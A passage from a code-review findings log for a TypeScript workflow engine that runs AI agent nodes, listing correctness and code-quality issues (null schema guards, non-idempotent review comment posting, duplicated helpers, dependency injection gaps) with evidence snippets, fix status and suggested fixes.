- **Problem:** The doc comment says "JSONata truthiness", but the function treats `[]`, `{}`, `NaN` and arrays of falsy values as truthy. JSONata's `$boolean` treats them as false. A condition such as `nodes.review.output.issues[severity='high']` can return an empty sequence or array, which then activates the "high" branch.
- **Evidence:**
  ```ts
  function jsonataTruthy(value: unknown): boolean {
    return !(value === false || value == null || value === "" || value === 0);
  }
  ```
- **Suggested fix:** Use JSONata's own semantics (evaluate `$boolean(<expr>)`, or port its cast: empty array, empty object and all-falsy arrays are false; `NaN` is false). Unit-test the edge cases.
- **Effort:** S

### CR-080 [Medium] Agent node with `output: json` and no schema always fails

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`parseRunConfig` on `NodeDefinition`, validated in `runNode` and `setNodeConfig`)
- **Current location:** lib/engine/nodes/kinds/agent/agent-node.ts:513-553 (541), lib/engine/nodes/kinds/agent/json-schema-lite.ts:43-49, lib/engine/nodes/declarative-schemas.ts:52
- **Re-verification note:** `applyOutput` still calls `jsonSchemaIssues(cfg.output_schema, …)` unconditionally. With the default `output_schema: null`, `check()` throws a plain "invalid output schema (missing)" Error. That Error bypasses the AgentOutputError retry, so every json-output agent without a schema fails. Top-level arrays or primitives are still cast to a record. Fix: guard on `cfg.output_schema && typeof … === "object"` (as script-node.ts:173 does) and reject non-object JSON with a SCHEMA_MISMATCH AgentOutputError.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-14
- **Location:** `lib/engine/nodes/agent/agent-node.ts:261-266`, `lib/engine/nodes/agent/json-schema-lite.ts:26-31`, `lib/engine/nodes/declarative-schemas.ts:29`
- **Problem:** `output_schema` defaults to `null`. `applyOutput` calls `validateJsonSchema(cfg.output_schema, …)` unconditionally, and `check(null)` throws "invalid output schema (missing)". So a json-output agent without a declared schema fails every run with a confusing error. `script-node.ts:175` guards the same call; the agent node doesn't. The agent also accepts top-level arrays/primitives from `extractJson`, and the error for those is an opaque Zod parse failure.
- **Evidence:**
  ```ts
  const parsed = extractJson(text);
  if (parsed == null) throw ...;
  validateJsonSchema(cfg.output_schema, parsed, this.label);  // null schema → throws
  const output = parsed as Record<string, unknown>;
  ```
- **Suggested fix:** Guard with `if (cfg.output_schema && typeof cfg.output_schema === "object")` as the script node does. Reject non-object JSON with a clear message before the cast.
- **Effort:** S

### CR-081 [Medium] `converse()` (chat-only) always trips the late-write guard: it logs a spurious "ignoring" event and hides run errors

- **Status at `abaa007`:** **Fixed** ([Task 16](review-tasks/16-run-lifecycle-late-writes.md))
- **Current location:** lib/engine/nodes/shared/agent-run-node.ts; lib/engine/harness/agent-runner.ts
- **Re-verification note:** `converse()` still calls `executeRun` while the node is done/awaiting_approval. Every chat-only reply therefore logs "…result arrived after the node was already … — ignoring", and returns before the `status !== "finished"` check, so errored conversational runs come back as normal replies. Fix: add an `ownsNodeStatus: false` option that skips the guard, and run the terminal-status check before the guard.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-15
- **Related:** CR-014 (NODE-01) — fix CR-014 first: depends on the superseded-run signal
- **Location:** `lib/engine/nodes/base/node-definition.ts:186-210`, `lib/engine/nodes/base/agent-runner.ts:176-182`
- **Problem:** `converse` is meant to leave node status alone, so the node is `done`/`awaiting_approval` while the run is in flight. `executeRun` then always takes the guard branch:
  - every chat-only reply logs "`<label> chat result arrived after the node was already done — ignoring`" to the node feed;
  - the branch returns *before* the `status !== "finished"` check, so an errored or cancelled conversational run comes back as a normal reply ("Done.").
- **Evidence:**
  ```ts
  const nodeNow = db.get<{ status: string }>(`SELECT status FROM nodes WHERE id=?`, nodeId);
  if (nodeNow?.status !== "running") { db.emitEvent(...— ignoring); return result; }
  if (result.status !== "finished") { ...throw }
  ```
- **Suggested fix:** Add an `executeRun` option such as `{ ownsNodeStatus: false }` that skips the guard. Always apply the terminal-status check before the guard.
- **Effort:** S

### CR-082 [Medium] A failure in stream or usage capture leaves the run row `running` and fails an agent run that finished

- **Status at `abaa007`:** **Fixed** ([Task 16](review-tasks/16-run-lifecycle-late-writes.md))
- **Current location:** lib/engine/harness/agent-runner.ts; lib/engine/harness/usage-tracker.ts; lib/engine/harness/pricing-source.ts
- **Re-verification note:** The run-row status update still sits after the try/finally, so a `port.stream` rejection leaves the row `running`. `captureRunUsage` (including the cloud `getUsage` call) is inside the same try, so a usage failure fails a finished agent run. The LiteLLM fetch errors are caught but it has no timeout. Fix: close the run row in `finally` (`error` when there's no result), wrap usage capture in its own try/catch that logs, and add `AbortSignal.timeout()` to the pricing fetch.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-16
- **Related:** CR-015 (NODE-02)
- **Location:** `lib/engine/nodes/base/agent-runner.ts:148-169`, `lib/engine/nodes/base/usage-tracker.ts:132-150`, `lib/engine/nodes/base/pricing-source.ts:95-103`
- **Problem:** The `runs.status` update happens after the `try/finally`:
  - If `port.stream` rejects, the row stays `running` until some later `persistRun`/cancel, and reconcile may later treat it as live.
  - `captureRunUsage` sits inside the same `try`. A rejection from `port.getUsage`, or from the LiteLLM fetch, throws out of `executeRun` even though the agent finished and pushed commits. The node is marked failed and a retry redoes the work.
  - `fetch(SOURCE_URL)` has no timeout, so a slow GitHub raw endpoint holds up node completion. The TTL only applies after a successful or failed fetch.
- **Evidence:**
  ```ts
  try {
    const out = await port.stream({ agentId, runId }, callbacks);
    result = out.result;
    costSummary = await this.usage.captureRunUsage({...});   // failure here fails the node
  } finally { stream.flushAll(); }
  db.run(`UPDATE runs SET status=? ...`, ...);                  // skipped on throw
  ```
- **Suggested fix:** Close the run row in `finally` (`error` when there's no result). Wrap usage capture in its own try/catch that logs and continues; usage is best-effort. Add `AbortSignal.timeout(…)` to the pricing fetch.
- **Effort:** S

### CR-083 [Medium] Multi-branch MR, pipeline, review and resolve derive the git branch without the build's `branch_pattern`

- **Status at `abaa007`:** **Fixed** (Task 21 — `branches.git_branch` + `MrTargetResolver`)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-17
- **Related:** CR-011 (ENG-06); CR-017 (NODE-04); CR-020 (NODE-07); CR-094 (NODE-28)
- **Location:** `lib/engine/nodes/build/build-node.ts:132-145`, `lib/engine/nodes/merge-request/merge-request-service.ts:62`, `lib/engine/nodes/pipeline/pipeline-node.ts:145-148`, `lib/engine/nodes/review/review-node.ts:54`, `lib/engine/nodes/resolve/resolve-node.ts:62`
- **Problem:** The build names branches with the `branch_pattern` knob. Every downstream consumer rebuilds the name with `ctxHelper.buildBranch(ctx, branchName)`, the built-in pattern. With a custom pattern on a multi-branch flow:
  - the MR service pushes and looks up a branch that doesn't exist;
  - the pipeline fix and resolve agents are told to check out the wrong branch.
- **Evidence:**
  ```ts
  // build: this.branchName(ctx, config, suffix)  → honors branch_pattern
  // MR service:
  const gitBranch = branchName ? flowCtxHelper.buildBranch(ctx, branchName) : flow.mr_branch;
  ```
- **Suggested fix:** Store the actual git branch on the `branches` row at build time (`finalizeBuild` already knows `resultBranch`). Have every consumer read it from there, which also removes the duplicated naming logic (NODE-28 (CR-094)).
- **Effort:** M

### CR-084 [Medium] The step-build context pack never shows sibling merge state or summaries

- **Status at `abaa007`:** **Fixed (Task 27)**

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-18
- **Location:** `lib/engine/nodes/build/step-build-node.ts:115`, `lib/engine/nodes/build/step-build-node.ts:224-245`, `lib/engine/nodes/build/step-build-node.ts:263-278`
- **Problem:** `contextPack(payload)` is given the output of `payloadOf()`, which rebuilds each sibling as `{id,title,files,status}` only. `contextPack` then reads `s.mergeStatus` and `s.summary`, which were stripped, so the live "Phase 3A" merge and summary details the doc comment promises never reach the prompt.
- **Evidence:**
  ```ts
  const payload = this.payloadOf(ctx);             // siblings → {id,title,files,status}
  const contextPack = this.contextPack(payload);
  // contextPack:
  const merge = typeof s.mergeStatus === "string" && s.mergeStatus ? ... : "";
  ```
- **Suggested fix:** Define one Zod `StepPayloadSchema` (step plus siblings with `mergeStatus?`/`summary?`). Parse `trigger_payload` with it once and pass the typed value to `contextPack`.
- **Effort:** S

### CR-085 [Medium] Review comment parsing is fragile and unvalidated, so reviews can post nothing or post "undefined"

- **Status at `abaa007`:** **Fixed** (Task 22 — `extractJson` + Zod validation, fail when output is not a valid comment list)
- **Current location:** lib/engine/nodes/kinds/review/review-node.ts; lib/engine/nodes/kinds/review/review-comments.ts

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-19
- **Location:** `lib/engine/nodes/review/review-node.ts:111-115`, `lib/engine/nodes/review/review-node.ts:130-133`
- **Problem:** The greedy `/\[[\s\S]*\]/` matches from the first `[` to the last `]` of the whole response, which includes markdown links and checkboxes. `JSON.parse` then fails, `comments = []`, and the node finishes `done` with "0 comment(s) posted" and no warning. When parsing does succeed, nothing checks the item shape, so a non-object item or a missing `body` posts `**AI Review**\n\nundefined`.
- **Evidence:**
  ```ts
  const m = (result.result ?? "").match(/\[[\s\S]*\]/);
  comments = m ? JSON.parse(m[0]) : [];
  } catch { comments = []; }
  ```
- **Suggested fix:** Reuse `extractJson` from `json-schema-lite`, which tries fences first. Validate with `z.array(z.object({file: z.string().optional(), line: z.number().int().optional(), body: z.string().min(1)}))`. Emit a warning event (or fail) when the response has no valid comment array.
- **Effort:** S

### CR-086 [Medium] Review posting isn't idempotent: a retry or partial failure posts duplicate MR comments

- **Status at `abaa007`:** **Fixed** (Task 22 — content hashes in review artifact meta, skip already-posted comments on retry)
- **Current location:** lib/engine/nodes/kinds/review/review-node.ts; lib/engine/nodes/kinds/review/review-comments.ts

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-20
- **Location:** `lib/engine/nodes/review/review-node.ts:120-135`
- **Problem:** Comments are posted one by one inside `finalize`. If `createComment` throws partway, the node fails with N comments already on the MR, and Retry re-runs the agent and posts everything again. The same happens after `recover()` returns false following a restart. Nothing records which comments were already posted.
- **Evidence:**
  ```ts
  for (const c of effective) {
    const body = ...;
    await host.createComment(repoUrl, mrIid, `**AI Review**\n\n${body}`);
    posted++;
  }
  ```
- **Suggested fix:** Persist each comment's content hash before or after posting (in the artifact meta or a `posted_comments` table, coordinating with the schema owner) and skip hashes already posted for this MR on retry. Alternatively, save the artifact first and post from it in a separate idempotent step.
- **Effort:** M

### CR-087 [Medium] Plan `recover()` ignores the `execution_default` knob and duplicates the persistence path

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** The plan node was rewritten. `recover()` (lib/engine/nodes/kinds/plan/plan-node.ts:301-340) now replays the recorded turn through `PlanOutputContract.applyTurnResult`, which publishes via `PlanStore.persistPlan` with the same `execution_default` knob, then `applyOutcome`. There is no second persistence copy any more.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-21
- **Related:** CR-091 (NODE-25)
- **Location:** `lib/engine/nodes/plan/plan-node.ts:1094-1104`, `lib/engine/nodes/plan/plan-node.ts:963-982`
- **Problem:** `persistPlan` publishes `execution` with a precedence of knob, then planner, then default. `recover()` always publishes the planner value (or `whole`) with source `planner`/`default`. A plan recovered under `execution_default: "steps"` is stamped `whole`, so the fan-out never happens. Recovery also skips `validationErrors`, the `feedback` meta and `finalizePlan`, which is a second copy of the logic that has already drifted.
- **Evidence:**
  ```ts
  const recoveredExec = this.normalizePlannerExecution(parsedExecution);
  const art = this.support.saveArtifact(node.id, ctx.flow.id, "plan", markdown, {
    recovered: true, execution: recoveredExec.value,
    executionSource: recoveredExec.rationale ? "planner" : "default", ...
  ```
- **Suggested fix:** Route recovery through `persistPlan(...)` + `finalizePlan(...)`, with a `recovered` flag added to the meta.
- **Effort:** S

### CR-088 [Medium] An agent-node chat overwrites the recorded input, so a later Retry loses the inherited upstream input

- **Status at `abaa007`:** **Open**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
- **Current location:** lib/engine/nodes/kinds/agent/agent-node.ts:383-405 (input at 392), lib/engine/nodes/shared/agent-run-node.ts:124-129, lib/engine/flow-engine.ts:1666,1678
- **Re-verification note:** The agent node's `chat()` still calls `execute()` with `input: {model, feedback}`, which overwrites `nodes.input`. A later `retryNode` replays that, losing the inherited upstream fields, and `{{input.*}}` renders empty. Fix: merge `{...node.input, feedback}`, or add an `execute` option that skips recording input for follow-ups.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-22
- **Location:** `lib/engine/nodes/agent/agent-node.ts:208-213`, `lib/engine/nodes/base/node-definition.ts:249-253`
- **Problem:** `chat()` calls `execute()` with `input: {model, feedback}`, and `execute()` writes that to `nodes.input`. `retryNode` replays `node.input`, so after any chat follow-up a retry runs with no inherited parent fields, and every `{{input.*}}` reference renders as empty.
- **Evidence:**
  ```ts
  return this.execute(ctx, {
    input: { model: model ?? null, feedback: content },   // replaces the inherited run input
  ```
- **Suggested fix:** Leave `nodes.input` alone for follow-ups: add an `execute` option `recordInput: false`, or merge `{...node.input, feedback}`.
- **Effort:** S

### CR-089 [Medium] The plan knobs `default_complex` and `decompose_default` are shown in the UI but never read

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`decompose_default` applied on pre-publish plan turns; `default_complex` removed earlier)
- **Current severity:** Low (was Medium)
- **Current location:** lib/engine/nodes/kinds/plan/plan-node.ts:97-98, lib/engine/nodes/kinds/plan/constants/config/decompose.ts:3-8, lib/engine/nodes/kinds/plan/constants/config/index.ts:12, lib/engine/nodes/kinds/plan/plan-node.ts:183, lib/engine/nodes/kinds/plan/plan-prompt.ts:87
- **Re-verification note:** `default_complex` was removed. `decompose_default` is still declared and shown in the config form, but nothing reads it. `turn()` builds `PlanInput.parse({prompt, promptIsBody})`, so `decompose` is always false and the decompose prompt branch is unreachable. Fix: apply `cfg.decompose_default` when building the pre-publish input, or remove the knob, its field and the dead branch.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-23
- **Location:** `lib/engine/nodes/plan/plan-node.ts:288-291`, `lib/engine/nodes/plan/plan-node.ts:309-310`
- **Problem:** Nothing in the repo reads either key (checked with grep; only docs mention them). `PlanInput` defaults `complex`/`decompose` to `false`, so turning either knob on does nothing. Users are misled.
- **Evidence:**
  ```ts
  default_complex: z.boolean().default(false),
  decompose_default: z.boolean().default(false),
  ```
- **Suggested fix:** In `run()`, apply `input.complex ??= cfg.default_complex` (this needs `complex` to be nullable in `PlanInput`, so that an explicit `false` still wins), and do the same for `decompose`. Otherwise remove the knobs.
- **Effort:** S

### CR-090 [Medium] Plan meta and step payloads are read from the DB with casts instead of Zod

- **Status at `abaa007`:** **Fixed (Task 27)**

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-24
- **Related:** CR-003 (APP-03); CR-091 (NODE-25); CR-094 (NODE-28)
- **Location:** `lib/engine/nodes/plan/plan-node.ts:792-806`, `lib/engine/nodes/build/build-node.ts:84-88`, `lib/engine/nodes/build/step-build-node.ts:224-245`, `lib/engine/nodes/declarative.ts:26-33`
- **Problem:** `latestPlan()` casts `m.steps as PlanStep[]` and `m.branches as PlanBranch[]`, and `triggerRuns` assigns `meta.branches` without checks. Recovered or legacy artifacts (and approve-time overrides) can be missing `dependsOn`. Scoped refine then crashes in `b.dependsOn.includes`, and `topoSortBranches` gets bad data. Step payloads are hand-parsed with `String(...)` coercion, and `loadRow` silently replaces a corrupt config with `{}`. AGENTS.md §3.4 requires validating at the boundary.
- **Evidence:**
  ```ts
  meta = { steps: m.steps as PlanStep[],
           branches: Array.isArray(m.branches) ? (m.branches as PlanBranch[]) : [] };
  ```
- **Suggested fix:** Add a `PlanArtifactMeta` Zod schema next to `plan/schema.ts` (`steps: z.array(PlanStep)`, `branches: z.array(PlanBranch)`, which applies the `dependsOn` defaults). Expose one `planArtifacts.latest(flowId)` reader that safeParses it, and use it in plan, build and step-build.
- **Effort:** M

### CR-091 [Medium] `plan-node.ts` is a 1,148-line file with about seven responsibilities

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** plan-node.ts is now 405 lines, a thin orchestrator over `PlanStore`, `PlanContextBlocks`, `PlanPromptBuilder`, `PlanOutputContract`, `PlanSplitter`, `PlanAgentSessions` and pure `BranchRefinement`. Most collaborators have vitest coverage (plan-store, plan-context, plan-prompt, plan-contract, branch-refinement tests).

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-25
- **Related:** CR-070 (ENG-26); CR-087 (NODE-21); CR-090 (NODE-24)
- **Location:** `lib/engine/nodes/plan/plan-node.ts:1-1148`
- **Problem:** One file holds:
  1. the context-block registry and its rendering (`CONTEXT_BLOCKS`, `resolveContextBlocks`, `render*`);
  2. the pure merge and diff (`mergeBranchRefine`, `diffBranchSteps`);
  3. prompt building (whole, scoped, execution directive);
  4. agent generation with the retry loop (`generatePlan`);
  5. artifact and checklist persistence (`persistPlan`, `finalizePlan`);
  6. recovery;
  7. prompt previews for the API.

  It is hard to test (none of these pieces have tests) and hard to review, and copies have already drifted (NODE-21 (CR-087)).
- **Evidence:** `wc -l` → 1148. Section markers: `// ── context block registry`, `// ── merge logic`, `// ── step diff`, `// ── prompts`, `// ── whole-plan machinery`, `// ── prompt previews`.
- **Suggested fix:** Extract `plan/context-blocks.ts` (a `PlanContextAssembler` class), `plan/plan-merge.ts` (pure functions with tests), `plan/plan-prompts.ts` (`PlanPromptBuilder`), `plan/plan-generator.ts` (the parse and retry loop), and `plan/plan-artifacts.ts` (latest/persist, shared with build; see NODE-24 (CR-090)). `PlanNode` then just composes them.
- **Effort:** L

### CR-092 [Medium] Built-ins bypass the shared `execute`/`applyOutcome` persistence path and hand-roll status, output and event writes

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
- **Current location:** lib/engine/nodes/kinds/pipeline/pipeline-node.ts:327-332, 417-431, 440-451, 474; lib/engine/nodes/kinds/resolve/resolve-node.ts:98-105; lib/engine/nodes/kinds/start/start-node.ts:74-83; lib/engine/nodes/kinds/build/build-node.ts:440-456; lib/engine/nodes/kinds/http/http-node.ts:92-98, 152-154; lib/engine/nodes/kinds/script/script-node.ts:107-111, 120-121, 132-133, 179-180; lib/engine/nodes/kinds/plan/plan-node.ts:230-241, 276-288
- **Re-verification note:** Plan, agent and decision success and recover paths now finish through `applyOutcome`. Pipeline (green/failed/canceled), resolve's no-comments early return, start (event "Flow started…" vs returned "flow started"), build `recoverBranch`, and the http/script failure paths still hand-roll `setNode` + emit. Fix: make `applyOutcome` (with optional agentId) the only terminal writer, have `recover()` return a `RunOutcome`, and add a base `markRunning()`.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-26
- **Related:** CR-014 (NODE-01); CR-015 (NODE-02)
- **Location:** `lib/engine/nodes/plan/plan-node.ts:334-335,453-461,494-503,1030-1040,1107-1121`, `lib/engine/nodes/pipeline/pipeline-node.ts:304-308,397-406,421-431,455,509`, `lib/engine/nodes/resolve/resolve-node.ts:71-79`, `lib/engine/nodes/start/start-node.ts:75-76`, `lib/engine/nodes/agent/agent-node.ts:232-241`, `lib/engine/nodes/decision/decision-node.ts:264-269`, `lib/engine/nodes/build/build-node.ts:377-383`
- **Problem:** `NodeDefinition` says "every node kind finishes through the one persistence path". In practice plan, pipeline, resolve (early return), start, and every `recover()` call `support.setNode` + `db.emitEvent` directly, each with its own ordering of artifact, output and status. A fix like NODE-01 (CR-014) (a guard in `applyOutcome`) therefore has to be made in about 15 places, and some already differ: start emits "Flow started…" but returns event "flow started"; plan's `runScoped` failure path skips `agent_id` consistency.
- **Evidence:**
  ```ts
  this.support.setNode(node.id, { status: "done", output: JSON.stringify(output) });
  db.emitEvent(ctx.flow.id, node.id, "lifecycle", `pipeline #${pipe.id} green...`);
  return { status: "done", output, event: `pipeline green (#${pipe.id})`, ... };
  ```
- **Suggested fix:** Make `applyOutcome` (extended with an optional `agentId`) the only writer of terminal state. Have `recover()` implementations return a `RunOutcome` that the base applies. Replace the direct `setNode({status:"running"})` calls with a base `markRunning(ctx, input)` that also issues the attempt token from NODE-02 (CR-015).
- **Effort:** M

### CR-093 [Medium] Declarative nodes copy-paste the same helpers

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 49](review-tasks/49-node-kind-structure.md)
- **Current location:** holdsForApproval: lib/engine/nodes/kinds/agent/agent-node.ts:582-588, lib/engine/nodes/kinds/http/http-node.ts:232-236, lib/engine/nodes/kinds/decision/decision-node.ts:394-398, lib/engine/nodes/kinds/script/script-node.ts:293-297; runConfig: agent-node.ts:420-423, http-node.ts:227-230, decision-node.ts:272-275, script-node.ts:289-292; http-node.ts:195-221 vs lib/engine/nodes/shared/template-renderer.ts:35-51; decision-node.ts:10
- **Re-verification note:** `{{a.b.c}}` rendering moved to the shared `TemplateRenderer` (used by agent and decision), and the unused `renderAgentPrompt` import in http-node is gone. Still duplicated: `holdsForApproval` ×4, `runConfig` ×4, the constructor/description/defaultConfig boilerplate ×4, and http's own `interpolate` path walk. Decision still imports `extractJson` from the sibling `agent/` kind. Fix: an abstract `DeclarativeNode<Def>` owning def/runConfig (strict)/holdsForApproval/description. Make http use `TemplateRenderer` with a secrets hook, and move `extractJson` to `nodes/shared`.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-27
- **Related:** CR-077 (NODE-11)
- **Location:** `lib/engine/nodes/agent/agent-node.ts:248-251,293-297`, `lib/engine/nodes/http/http-node.ts:198-238`, `lib/engine/nodes/decision/decision-node.ts:276-279,399-403`, `lib/engine/nodes/script/script-node.ts:291-300`
- **Problem:**
  - `holdsForApproval()` appears four times, byte for byte.
  - `runConfig()` appears four times.
  - The constructor/`description`/`defaultConfig` boilerplate appears four times.
  - The `{{a.b.c}}` path walk is in `renderAgentPrompt` and again inside `HttpTemplateNode.interpolate`. `http-node.ts:8` imports `renderAgentPrompt` and never uses it.
  - Decision and http import helpers from `agent/agent-node.ts`, which couples sibling node kinds together.
- **Evidence:**
  ```ts
  private holdsForApproval(ctx: FlowCtx): boolean {
    const g = templateStore.graphForFlow(ctx.flow.id);
    const spec = g?.byKey.get(this.key);
    return spec?.trigger.type === "approval";
  }   // ×4
  ```
- **Suggested fix:** Add an abstract `DeclarativeNode<Def>` (genuinely shared behaviour, which §3.2 allows) with `def`, `runConfig` (strict; see NODE-11 (CR-077)), `holdsForApproval` and `description`. Move `renderTemplate(text, vars, {secrets?})` to `nodes/base/template-render.ts` and use it in agent, http and decision.
- **Effort:** M

### CR-094 [Medium] Built-in nodes duplicate MR resolution, the "result branch + diff artifact" finalize, and the latest-plan query

- **Status at `abaa007`:** **Fixed** (Task 21 — `MrTargetResolver` + `BranchNamer`; latest-plan ordering still tracked as NEW-C1)

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-28
- **Related:** CR-083 (NODE-17); CR-090 (NODE-24)
- **Location:** `lib/engine/nodes/pipeline/pipeline-node.ts:131-155`, `lib/engine/nodes/review/review-node.ts:49-58`, `lib/engine/nodes/resolve/resolve-node.ts:54-66`; `lib/engine/nodes/build/build-node.ts:247-271,326-337`, `lib/engine/nodes/build/step-build-node.ts:151-162,200-209`; `lib/engine/nodes/build/build-node.ts:73-77,291-293`, `lib/engine/nodes/build/step-build-node.ts:248-255`, `lib/engine/nodes/plan/plan-node.ts:745-750,786-790`; `lib/engine/nodes/build/build-node.ts:132-138` vs `lib/engine/nodes/base/flow-context.ts:90-95`
- **Problem:**
  - `resolveMr` exists three times (review even makes it public), with different error messages, and resolve's copy allows a `null` mrIid.
  - The "currentBranch-or-git-branches, makeDiff, saveArtifact('diff')" block exists four times.
  - The `SELECT … artifacts … kind='plan' ORDER BY version DESC LIMIT 1` query exists five times: some filter `n.type='plan'` and some don't.
  - The branch prefix/slug logic is copied from `FlowContextHelper.buildBranch`.

  These copies are how bugs like NODE-17 (CR-083) spread.
- **Evidence:**
  ```ts
  // build-node.ts:291 (no n.type filter) vs build-node.ts:75 (n.type=?)
  `SELECT a.content FROM artifacts a JOIN nodes n ON n.id=a.node_id
   WHERE n.flow_id=? AND a.kind='plan' ORDER BY a.version DESC LIMIT 1`
  ```
- **Suggested fix:** Add `MrTargetResolver.resolve(ctx, branchName)` in `nodes/base`, `BuildNode.captureDiff(ctx, result, fallbackBranch, meta)` (protected), and `PlanArtifactStore.latest(flowId)` (see NODE-24 (CR-090)). Have `branchName()` call a shared `BranchNamer` that `buildBranch` uses too.
- **Effort:** M

### CR-095 [Medium] Nodes and base services reach into the DB and other nodes' rows directly, and the "injected" services aren't really injected

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 48](review-tasks/48-backend-dependency-injection.md)
- **Current location:** lib/engine/harness/agent-runner.ts:1-3, 12, 56, 60-61, 117-118, 168, 176; lib/engine/nodes/kinds/build/build-node.ts:179-180; lib/engine/nodes/kinds/pipeline/pipeline-node.ts:170-179; lib/engine/nodes/kinds/review/review-node.ts:102
- **Re-verification note:** `NodeDefinition`/`AgentRunNode` now take support/runner/ctxHelper through the constructor, and resolve updates comments via `NodeSupport.resolveComment`. `AgentRunner` still uses the `db`, `config`, `agentPortRegistry` and `worktreeManager` singletons and raw run/node SQL. Build still reads the plan node's row and `input.model` by type. Nodes call `gitHostRegistry` directly. Fix: inject the db/event sink, port registry and worktree manager into `AgentRunner`, have the plan publish `model` in its output, and inject a git-host resolver.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-29
- **Related:** CR-051 (APP-16)
- **Location:** `lib/engine/nodes/base/agent-runner.ts:1-3,12,56,60-61,114,117-119`, `lib/engine/nodes/base/node-definition.ts:120-122,267`, `lib/engine/nodes/build/build-node.ts:80-82`, `lib/engine/nodes/plan/plan-node.ts:991-1001`, `lib/engine/nodes/resolve/resolve-node.ts:146`
- **Problem:**
  - `AgentRunner` is constructor-injected for three services but uses the `db`, `config`, `agentPortRegistry` and `worktreeManager` module singletons directly, and runs raw SQL against `runs`/`nodes`.
  - `NodeDefinition` assigns its "injected" services as field initializers from singletons, and calls `db.emitEvent` directly.
  - Build reads the *plan node's* row and its `input.model` JSON by `type='plan'`.
  - Plan re-reads its own config from the DB by `type`, ignoring the `config` argument it was given (and breaking for a second plan instance).
  - Resolve writes `comments` rows inline.

  None of this can be unit-tested without a real DB, which goes against §3.1/§3.2.
- **Evidence:**
  ```ts
  const planNode = rows.get(NodeRow, `SELECT * FROM nodes WHERE flow_id=? AND type=?`, ctx.flow.id, NODE_KEYS.PLAN);
  const planModel = (planNode?.input as { model?: string } | null)?.model ?? undefined;
  ```
- **Suggested fix:** Inject `db`/event sink, the port registry and the worktree manager into `AgentRunner` and `NodeSupport`. Pass `NodeSupport`/`AgentRunner` through the `NodeDefinition` constructor. Have the plan publish `model` in its output contract and the build read `nodes.plan.output` via the flow context. Thread `config` into `executionDefault` and `persistPlan`. Move comment updates into a `CommentStore`.
- **Effort:** L

### CR-096 [Medium] The declarative def cache is module-level mutable state, and kinds dispatch through `switch` instead of a registry

- **Status at `abaa007`:** **Open**, fix in [Task 49](review-tasks/49-node-kind-structure.md)
- **Current location:** lib/engine/nodes/declarative.ts:16, 53-61, 69-80; lib/engine/nodes/declarative-schemas.ts:148-173
- **Re-verification note:** Unchanged. A module-level `const cache = new Map()` breaks the singleton rule and goes stale across HMR. Kinds still dispatch through two parallel `switch (row.kind)` blocks. Fix: a `DeclarativeKindRegistry` (kind → schema + ctor) and a `DeclarativeDefCache` created via `lib/singleton.ts`, used by both `parseDeclarativeConfig` and `instantiateDeclarative`.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-30
- **Related:** CR-059 (ENG-14)
- **Location:** `lib/engine/nodes/declarative.ts:16`, `lib/engine/nodes/declarative.ts:53-61`, `lib/engine/nodes/declarative-schemas.ts:105-112`
- **Problem:** `const cache = new Map()` at module level breaks the §3.1 singleton rule and does not survive HMR (stale defs after edits in dev). The declarative kinds are dispatched through two parallel `switch (row.kind)` blocks plus string literals, so adding a kind means editing both, against the §3.2 "registries over type-string switch" rule.
- **Evidence:**
  ```ts
  const cache = new Map<string, NodeDefinition<unknown, Record<string, unknown>>>();
  ...
  switch (row.kind) { case "agent": return new AgentTemplateNode(row, inst) as ...; ... }
  ```
- **Suggested fix:** Create a `DeclarativeKindRegistry` (`kind → {schema, ctor}`) and a `DeclarativeDefCache` class created through `lib/singleton.ts`. Have `parseDeclarativeConfig` and `instantiateDeclarative` both look kinds up in the registry.
- **Effort:** M

### CR-097 [Medium] Several plan-step and plan-validation gaps (cycles, id-less steps, wrong ids in the diff)

- **Status at `abaa007`:** **Partly fixed (Task 27)** — scoped sub-plan diff uses merged branch steps; `diffSteps` still ignores id-less steps

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-31
- **Location:** `lib/engine/nodes/build/build-node.ts:115-129`, `lib/engine/nodes/plan/schema.ts:134-164`, `lib/engine/nodes/plan/plan-node.ts:221-234`, `lib/engine/nodes/plan/plan-node.ts:482-483`
- **Problem:**
  - Branch `dependsOn` cycles are never rejected: `validateBranchConstraints` only checks that references exist, and `topoSortBranches` marks a node visited before visiting its dependencies, so cycles are silently ordered arbitrarily.
  - `diffBranchSteps` drops steps without an id from both maps, so they are never reported as added or removed.
